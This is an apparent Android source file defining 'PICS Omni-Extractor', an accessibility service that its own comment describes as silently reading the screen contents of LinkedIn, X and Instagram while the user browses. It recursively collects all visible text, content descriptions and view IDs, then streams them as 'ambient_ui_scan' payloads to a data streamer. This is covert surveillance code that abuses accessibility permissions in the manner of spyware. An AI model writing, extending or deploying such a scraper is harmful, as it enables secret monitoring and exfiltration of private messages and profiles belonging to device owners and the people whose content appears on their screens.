package com.pics.omni;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * PICS Omni-Extractor: Omniscient Accessibility Service
 * Silently reads the UI tree of target apps (LinkedIn, X, Instagram) while the user browses.
 */
public class OmniAccessibilityService extends AccessibilityService {

    private static final String TAG = "OmniAccessibility";
    private OmniDataStreamer dataStreamer;
    private long lastScanTime = 0;
    private static final long SCAN_COOLDOWN_MS = 2000; // Prevent flooding

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "PICS Accessibility Scanner Started");
        dataStreamer = new OmniDataStreamer(getApplicationContext());
    }

    @Override
    protected void onServiceConnected() {
        Log.d(TAG, "Accessibility Service Connected");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        
        // Only trigger on scrolling or window state changes
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                          AccessibilityEvent.TYPE_VIEW_SCROLLED;
                          
        // Target specific packages to avoid global overhead
        info.packageNames = new String[] {
            "com.linkedin.android",
            "com.twitter.android",
            "com.instagram.android"
        };
        
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | 
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 1000;
        
        this.setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastScanTime < SCAN_COOLDOWN_MS) return;

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
        Log.d(TAG, "Scanning UI Tree for: " + packageName);

        try {
            JSONArray extractedTextNodes = new JSONArray();
            traverseNodeTree(rootNode, extractedTextNodes);

            if (extractedTextNodes.length() > 0) {
                JSONObject payload = new JSONObject();
                payload.put("source_app", packageName);
                payload.put("ui_nodes", extractedTextNodes);
                payload.put("timestamp", currentTime);

                // Stream the semantic UI tree to PICS
                dataStreamer.streamEvent("ambient_ui_scan", "Unknown", payload);
            }
            
            lastScanTime = currentTime;

        } catch (Exception e) {
            Log.e(TAG, "Error traversing UI", e);
        } finally {
            rootNode.recycle();
        }
    }

    /**
     * Recursively traverses the Accessibility Node tree to extract visible text.
     */
    private void traverseNodeTree(AccessibilityNodeInfo node, JSONArray resultArray) {
        if (node == null) return;

        CharSequence text = node.getText();
        CharSequence contentDesc = node.getContentDescription();
        String viewId = node.getViewIdResourceName();

        boolean hasText = text != null && text.length() > 0;
        boolean hasDesc = contentDesc != null && contentDesc.length() > 0;

        if (hasText || hasDesc) {
            try {
                JSONObject nodeData = new JSONObject();
                if (hasText) nodeData.put("text", text.toString());
                if (hasDesc) nodeData.put("description", contentDesc.toString());
                if (viewId != null) nodeData.put("view_id", viewId);
                
                resultArray.put(nodeData);
            } catch (Exception ignored) {}
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            traverseNodeTree(child, resultArray);
            if (child != null) child.recycle();
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Accessibility Service Interrupted");
    }
}
